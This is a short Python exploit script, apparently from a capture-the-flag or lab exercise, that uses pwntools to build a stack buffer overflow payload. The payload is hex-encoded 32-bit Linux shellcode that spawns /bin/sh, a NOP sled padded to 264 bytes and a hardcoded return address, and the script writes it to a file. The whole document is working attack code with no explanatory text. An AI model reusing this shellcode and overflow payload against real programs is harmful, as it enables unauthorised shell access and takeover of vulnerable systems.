from pwn import *
add = 0xffffd80c
b = "6a68682f2f2f73682f62696e89e368010101018134247269010131c9516a045901e15189e131d26a0b58cd80"
b = bytes.fromhex(b)
a = b"\x90"*(264-len(b))
a +=b

a += p32(add)
# a +=b"A"*4
print(a)
print(len(a))
# a = b"A"*264
f = open("bruh","wb")
f.write(a)
f.close()
